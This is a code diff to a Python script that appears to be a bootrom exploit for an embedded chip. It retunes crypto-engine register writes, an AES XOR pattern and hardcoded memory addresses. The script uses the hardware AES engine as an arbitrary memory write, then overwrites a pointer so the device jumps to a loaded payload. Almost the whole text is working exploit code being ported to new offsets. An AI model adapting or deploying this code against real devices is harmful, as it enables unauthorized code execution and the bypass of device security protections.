@@ -21,10 +21,7 @@ def init(dev):
 
 
 def hw_acquire(dev):
-    #dev.write32(CRYPTO_BASE, [0x1F, 0x12000])
-    dev.write32(CRYPTO_BASE, dev.read32(CRYPTO_BASE) & 0xFFFFFFF0)
-    dev.write32(CRYPTO_BASE, dev.read32(CRYPTO_BASE) | 0xF)
-    dev.write32(CRYPTO_BASE + 0x04, dev.read32(CRYPTO_BASE + 0x04) & 0xFFFFDFFF)
+    dev.write32(CRYPTO_BASE, [0x1F, 0x12000])
 
 def hw_release(dev):
     dev.write32(CRYPTO_BASE, dev.read32(CRYPTO_BASE) & 0xFFFFFFF0)
@@ -76,7 +73,7 @@ def aes_write16(dev, addr, data):
     if len(data) != 16:
         raise RuntimeError("data must be 16 bytes")
 
-    pattern = bytes.fromhex("6c38d88958fd0cf51efd9debe8c265a5")
+    pattern = bytes.fromhex("4dd12bdf0ec7d26c482490b3482a1b1f")
 
     # iv-xor
     words = []
@@ -92,7 +89,7 @@ def aes_write16(dev, addr, data):
 
     dev.write32(CRYPTO_BASE + 0xC00 + 26 * 4, words)
 
-    dev.write32(CRYPTO_BASE + 0xC04, 0xD848) # src to VALID address which has all zeroes (otherwise, update pattern)
+    dev.write32(CRYPTO_BASE + 0xC04, 0) # src to VALID address which has all zeroes (otherwise, update pattern)
     dev.write32(CRYPTO_BASE + 0xC08, addr) # dst to our destination
     dev.write32(CRYPTO_BASE + 0xC0C, 1)
     dev.write32(CRYPTO_BASE + 0xC14, 18)
@@ -121,7 +118,7 @@ def load_payload(dev, path):
 #    with open("dump", "wb") as dump:
 #        for x in range(0, 0x20000, 16):
 #            dump.write((aes_read16(dev, x)))
-    aes_write16(dev, 0x122774, bytes.fromhex("00000000000000000000000080000000"))
+    aes_write16(dev, 0x102868, bytes.fromhex("00000000000000000000000080000000"))
 
     with open(path, "rb") as fin:
         payload = fin.read()
@@ -140,7 +137,7 @@ def load_payload(dev, path):
     dev.write32(load_addr, words)
 
     log("Let's rock")
-    dev.write32(0x1227B4, load_addr, status_check=False)
+    dev.write32(0x1028A8, load_addr, status_check=False)
 
     log("Wait for the payload to come online...")
     dev.wait_payload()
